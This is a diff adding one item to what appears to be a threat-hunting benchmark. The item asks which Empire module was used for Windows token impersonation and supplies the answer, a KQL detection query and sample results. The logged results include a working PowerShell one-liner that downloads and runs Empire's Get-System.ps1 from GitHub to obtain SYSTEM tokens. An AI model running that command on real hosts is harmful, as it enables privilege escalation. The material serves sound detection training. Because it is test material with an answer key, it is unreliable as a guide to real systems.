@@ -1,0 +1,36 @@
+{
+    "technique_id": "T1134.001",
+    "question_id": "34f0a430-9d04-4d98-bcb5-1989f14719f0",
+    "context": "On Windows systems, attackers can leverage SeDebugPrivilege to duplicate and impersonate SYSTEM tokens by downloading and executing remote PowerShell modules.",
+    "objective": "Detect when an endpoint has fetched and run a PowerShell module to perform token duplication via SeDebugPrivilege.",
+    "technical_details": {
+        "command_analysis": "The adversary uses PowerShell to set TLS to 1.2, downloads a remote PS1 script from a GitHub URL, and calls Get-System with a Token technique flag.",
+        "detection_approach": "Scan DeviceProcessEvents for PowerShell processes whose command line includes web requests to GitHub and invocation of a module name, then extract the module identifier."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Phrase the question to guide the analyst toward examining PowerShell command-line activity for a module name, without revealing the module itself.",
+    "prompt": "A Windows host logs show PowerShell fetching and executing a remote script to gain SeDebugPrivilege token duplication. Which Empire module was invoked?",
+    "answer": [
+        "Get-System"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName in (\"powershell.exe\",\"pwsh.exe\")\n| where ProcessCommandLine has \"ServicePointManager\" and (ProcessCommandLine has \"github.com\" or ProcessCommandLine has \"raw.githubusercontent.com\")\n| extend Module = extract(@\"([\\w-]+)\\.ps1\", 1, ProcessCommandLine)\n| where Module == \"Get-System\"\n| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, Module",
+    "KQL_validation_message": "KQL query validation successful: The query results include a row where the 'Module' field is 'Get-System' and the 'ProcessCommandLine' shows a PowerShell command that downloads and runs 'Get-System.ps1', specifically invoking 'Get-System'. This directly matches the expected answer, providing clear evidence that the activity described ('Get-System') was detected.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "AccountName",
+            "FileName",
+            "ProcessCommandLine",
+            "Module"
+        ],
+        [
+            "2025-05-07 16:52:09.842640+00:00",
+            "windows-vm",
+            "wipro",
+            "powershell.exe",
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}",
+            "Get-System"
+        ]
+    ]
+}
